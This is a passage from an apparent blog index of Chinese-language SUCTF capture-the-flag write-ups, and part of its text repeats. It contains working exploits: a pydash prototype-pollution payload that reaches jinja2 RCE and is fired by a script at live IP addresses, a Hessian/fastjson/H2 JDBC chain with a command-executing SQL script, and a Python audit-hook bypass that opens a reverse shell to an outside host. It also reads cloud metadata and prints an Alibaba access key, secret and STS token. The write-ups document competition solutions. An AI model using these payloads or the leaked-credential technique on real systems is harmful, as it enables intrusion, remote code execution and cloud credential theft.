-1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in 